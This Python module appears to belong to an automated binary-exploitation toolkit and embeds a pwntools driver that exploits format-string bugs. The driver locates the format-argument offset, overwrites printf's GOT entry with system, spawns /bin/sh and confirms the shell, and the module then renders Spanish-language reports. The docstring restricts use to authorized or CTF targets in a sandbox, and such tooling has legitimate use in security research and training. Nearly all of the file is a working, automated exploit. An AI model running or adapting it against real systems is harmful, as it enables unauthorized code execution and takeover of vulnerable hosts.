"""Format-string exploitation, verified by getting a shell in the sandbox.

For a binary that uses user input as a printf format inside a loop, this finds the
format-argument offset, overwrites printf@GOT with system (ASLR disabled so system is
fixed), and then sends '/bin/sh' so the next printf(buf) becomes system('/bin/sh').
Confirms a real shell. For AUTHORIZED / CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

from ._sandbox import run_driver

_DRIVER = r'''
import sys
from pwn import *
name = sys.argv[1]
elf = ELF(name, checksec=False); context.binary = elf; context.log_level = "error"
prompt = sys.argv[2].encode() if len(sys.argv) > 2 else b"say: "
if "printf" not in elf.got:
    print("NOT_APPLICABLE (no printf@GOT)"); sys.exit(1)
io = process([elf.path], aslr=False)
try:
    io.recvuntil(prompt, timeout=2)
except Exception:
    pass
# find the format-arg offset with a marker + %p chain
io.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 21)))
resp = io.recvuntil(prompt, timeout=3)
offset = None
for i, tok in enumerate(resp.split(b".")[1:], 1):
    if tok.strip() == b"0x4141414141414141":
        offset = i; break
if offset is None:
    print("NO_OFFSET"); sys.exit(1)
libc = io.libc; system = libc.symbols["system"]
pie_base = 0
if elf.pie:
    import os as _os
    bn = _os.path.basename(name)
    for path, base in (io.libs() or {}).items():       # 1) pwntools' own mapping
        if _os.path.basename(path) == bn:
            pie_base = base; break
    if not pie_base:                                     # 2) /proc/<pid>/maps (lowest mapping)
        try:
            addrs = [int(l.split("-")[0], 16) for l in open("/proc/%d/maps" % io.pid) if bn in l]
            if addrs:
                pie_base = min(addrs) & ~0xfff
        except Exception:
            pass
    if not pie_base:
        pie_base = 0x555555554000                        # 3) standard ASLR-off PIE base
printf_got = elf.got["printf"] + pie_base
MARK = b"BINORACLE_FMT_PWNED"
for wsz in ("short", "byte"):
    try:
        payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
        io.sendline(payload)
        io.recvuntil(prompt, timeout=3)
        io.sendline(b"/bin/sh")
        io.sendline(b"echo " + MARK)
        out = io.recvrepeat(2)
        if MARK in out:
            print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
            sys.exit(0)
    except Exception:
        pass
    # reopen for next attempt
    try: io.close()
    except Exception: pass
    io = process([elf.path], aslr=False)
    try: io.recvuntil(prompt, timeout=2)
    except Exception: pass
print("NOT_VERIFIED offset=%d" % offset)
sys.exit(1)
'''


def autofmt(binary: str, run: bool = True, prompt: str = "say: ") -> dict:
    res = run_driver(binary, _DRIVER, ".binoracle_fmt.py", args=[prompt])
    if not res.get("ok"):
        return res
    eng = res.get("engine", "sandbox")
    res["note"] = (f"format-string -> printf@GOT=system: shell verificada por ejecucion ({eng})"
                   if res.get("verified")
                   else f"format-string: no verificado ({eng}) (no aplica printf(user) en bucle o timing)")
    return res


def render_fmt(r: dict) -> str:
    out = ["## Auto format-string (GOT overwrite -> shell, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- {r['detail']}")
    out.append(f"- {r.get('note','')}")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
